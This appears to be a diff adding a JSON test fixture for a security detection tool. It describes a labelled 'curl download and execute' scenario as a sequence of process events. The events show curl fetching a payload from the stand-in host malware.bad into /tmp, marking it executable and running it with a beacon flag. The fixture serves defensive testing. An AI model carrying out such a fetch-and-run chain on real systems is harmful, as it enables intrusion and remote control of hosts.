@@ -1,0 +1,14 @@
+{
+  "id": "eval_01_curl_lolbin",
+  "name": "LOLBin Curl Payload Download & Exec",
+  "category": "Ingress Tool Transfer",
+  "description": "Ingress tool transfer using curl, chmod +x, and execution from /tmp.",
+  "expected_exploitable": true,
+  "is_confound_trap": false,
+  "events": [
+    {"id":"e1","kind":"exec","host_id":"h1","boot_id":"b","pid":100,"ppid":1,"exe":"/usr/bin/bash","args":"bash"},
+    {"id":"e2","kind":"exec","host_id":"h1","boot_id":"b","pid":101,"ppid":100,"exe":"/usr/bin/curl","args":"-s http://malware.bad/payload -o /tmp/sx_payload","raddr":"192.168.1.50","rport":80},
+    {"id":"e3","kind":"exec","host_id":"h1","boot_id":"b","pid":102,"ppid":100,"exe":"/usr/bin/chmod","args":"+x /tmp/sx_payload","path":"/tmp/sx_payload"},
+    {"id":"e4","kind":"exec","host_id":"h1","boot_id":"b","pid":103,"ppid":100,"exe":"/tmp/sx_payload","args":"--beacon","path":"/tmp/sx_payload"}
+  ]
+}
